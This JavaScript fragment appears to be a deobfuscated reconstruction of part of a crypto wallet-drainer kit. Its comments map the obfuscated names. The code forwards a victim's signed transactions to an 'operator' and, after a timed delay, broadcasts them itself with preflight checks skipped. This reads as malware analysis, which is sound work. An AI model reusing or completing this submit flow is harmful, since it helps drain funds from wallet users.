/**
 * Signed-transaction submit flow (original functions 芏 and 蔓).
 *
 * After the wallet signs, the kit sends the signed transactions to the
 * operator AND broadcasts them itself. The self-broadcast only happens
 * when state.he.ie is unset and state.he.be === 0, and is delayed
 * 2500 ms so the operator POST lands first.
 *
 * 蔓: each signed transaction is standard-base64 encoded and sent
 * through the RPC proxy (姍) with sendTransaction, skipPreflight: true,
 * encoding "base64". Promises are fire-and-forget.
 */

async function broadcastSigned(signedTransactions) {
  // 蔓
  const sent = [];
  for (const tx of signedTransactions) {
    sent.push(
      solana.sendTransaction(tx.toBase64(), {
        skipPreflight: true,
        encoding: "base64",
      }),
    );
  }
}

async function submitSignedTransactions(state, signedTransactions) {
  // 芏
  if (!Array.isArray(signedTransactions)) {
    throw new StatusError("34"); // 掷: Error subclass carrying .Ie
  }
  const he = state.he;
  const shouldSelfBroadcast = !he.ie && he.be === 0;

  ui.reset("Spinner");
  const timer = shouldSelfBroadcast
    ? setTimeout(() => broadcastSigned(signedTransactions), 2500)
    : undefined;

  const attemptCounter = globalState()?.ne ?? 0; // 信() -> 屭
  // 夾 = the OperatorClient instance; zt is its retry wrapper.
  await operator.withRetry(() =>
    operator.submitSigned(state, attemptCounter, signedTransactions),
  );
}

